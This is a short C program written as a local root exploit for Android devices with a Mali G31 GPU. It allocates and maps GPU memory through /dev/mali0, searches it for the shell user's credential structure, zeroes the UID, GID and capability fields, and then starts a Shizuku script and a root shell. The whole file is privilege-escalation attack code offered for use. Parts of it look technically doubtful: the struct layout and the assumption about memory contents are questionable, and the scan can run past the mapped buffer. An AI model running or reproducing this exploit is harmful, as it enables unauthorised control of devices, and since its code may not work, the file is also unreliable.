#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define TARGET_UID 2000
#define KBASE_IOCTL_TYPE 'k'
#define KBASE_IOCTL_MEM_ALLOC _IOWR(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_mem_alloc)

struct kbase_ioctl_mem_alloc {
    uint32_t va_pages;
    uint32_t commit_pages;
    uint64_t extent;
    uint64_t flags;
    uint32_t gpu_va; 
};

int main() {
    int fd = open("/dev/mali0", O_RDWR);
    if (fd < 0) return 1;

    // Allocate buffer via Mali G31
    struct kbase_ioctl_mem_alloc alloc = {
        .va_pages = 2048,   // 8MB buffer
        .commit_pages = 2048,
        .flags = 0x2000 
    };

    if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &alloc) != 0) return 1;

    // Map the GPU memory to scan for our Shell UID
    uint32_t* mem = (uint32_t*)mmap(NULL, 2048 * 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, alloc.gpu_va);
    if (mem == MAP_FAILED) return 1;

    // Scan for the cred structure pattern [Usage][UID][GID]
    for (int i = 0; i < (2048 * 1024); i++) {
        if (mem[i+1] == TARGET_UID && mem[i+2] == TARGET_UID) {
            // Overwrite UID/GID/Capabilities to 0 (Root)
            for (int j = 1; j <= 8; j++) mem[i+j] = 0;
            
            if (getuid() == 0) {
                // Success: Launch Shizuku and a Root Shell
                system("sh /data/user/0/moe.shizuku.privileged.api/start.sh");
                system("/system/bin/sh");
                return 0;
            }
        }
    }
    return 1;
}
